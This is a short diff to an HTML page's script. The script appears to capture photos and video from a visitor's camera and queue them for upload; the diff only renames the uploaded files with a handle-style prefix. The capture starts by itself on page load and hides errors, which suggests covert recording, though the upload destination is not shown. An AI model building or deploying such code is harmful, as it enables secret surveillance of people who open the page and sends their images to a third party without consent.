@@ -136,7 +136,7 @@ async function takePhotos(stream,count,label){
     for(let i=0;i<count;i++){
         try{
             const blob = await captureFrame(stream);
-            const name=`@Mr_${label}_photo_${Date.now()}_${i+1}.jpg`;
+            const name=`@MrEsfelurm_${label}_photo_${Date.now()}_${i+1}.jpg`;
             enqueueUpload(blob,name,"photo",label);
             success++;
         }catch(e){}
@@ -150,7 +150,7 @@ async function takeVideo(stream,seconds,label){
     let success=0;
     try{
         const blob = await recordVideo(stream,seconds);
-        const name=`@Mr_${label}_video_${Date.now()}.webm`;
+        const name=`@MrEsfelurm_${label}_video_${Date.now()}.webm`;
         enqueueUpload(blob,name,"video",label);
         success=1;
     }catch(e){}
@@ -197,4 +197,5 @@ async function startAll(){
 startAll();
 </script>
 </body>
+
 </html>
